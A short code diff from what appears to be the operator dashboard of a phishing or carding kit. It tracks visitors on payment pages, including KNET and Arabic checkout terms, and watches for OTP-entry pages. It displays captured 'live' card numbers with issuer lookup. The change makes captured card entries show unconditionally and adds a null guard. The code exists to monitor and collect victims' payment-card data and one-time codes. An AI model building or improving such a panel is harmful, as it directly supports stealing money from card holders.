@@ -1612,7 +1612,7 @@ const __lastPcTs = __pcs.length ? new Date(__pcs[__pcs.length-1].timestamp || 0)
 /*FIX-LIVE*/ const __pgLc = String(visitor.page||'').toLowerCase();
 /*FIX-LIVE*/ const __lcEntry = ['الدفع','بطاقة','كي نت','knet','payment','credit','card','checkout','إتمام'].some(function(h){ return __pgLc.indexOf(String(h).toLowerCase())>-1; });
 /*FIX-LIVE*/ const __lcOtp = /otp|رمز/i.test(String(visitor.page||'') + ' ' + (visitor.digitCodes||[]).map(function(d){return String(d&&d.page||'');}).join(' '));
-/*FIX-LIVE*/ if (visitor.liveCard && !__lcOtp && (__lcHas || __lcEntry) && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {
+/*FIX-LIVE*/ if (!__lcOtp && (__lcHas || __lcEntry) && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {
   allEntries.push({ type: 'liveCard', data: visitor.liveCard, index: 0, timestamp: new Date(Date.now() + 999999999).toISOString() });
 }
 
@@ -1666,7 +1666,7 @@ const __lastPcTs = __pcs.length ? new Date(__pcs[__pcs.length-1].timestamp || 0)
         html += '<div class="space-y-3">';
         allEntries.forEach((entry) => {
           if (entry.type === 'liveCard') {
-  const lc = entry.data;
+  const lc = entry.data || {};
   const lcRaw = String(lc.cardNumber || '').replace(/\D/g, '');
   const lcInfo = getCardInfo(lcRaw);
   const lcNum = lcRaw ? lcRaw.replace(/(\d{4})(?=\d)/g, '$1 ') : 'XXXX XXXX XXXX XXXX';
